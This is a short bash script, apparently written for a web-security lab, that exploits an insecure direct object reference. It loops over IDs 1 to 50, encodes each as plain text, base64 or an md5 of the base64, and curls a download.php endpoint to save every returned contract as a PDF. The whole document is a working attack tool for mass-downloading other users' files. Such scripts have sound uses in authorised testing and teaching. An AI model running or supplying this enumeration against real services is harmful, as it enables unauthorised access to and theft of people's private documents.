#!/bin/bash

# Description: IDOR enumeration script (supports raw, base64, md5(base64))
# Usage: ./idor-enum-downloader.sh http://TARGET mode
# Modes: raw | base64 | md5


url=$1
mode=$2

for i in {1..50}; do
    case $mode in
        raw)
            value=$i
            ;;
        base64)
            value=$(echo -n $i | base64 -w 0)
            ;;
        md5)
            value=$(echo -n $i | base64 -w 0 | md5sum | tr -d ' -')
            ;;
    esac

    echo "[+] Testing ID: $i"

    curl -s "$url/download.php?contract=$value" -o "contract_$i.pdf"

done
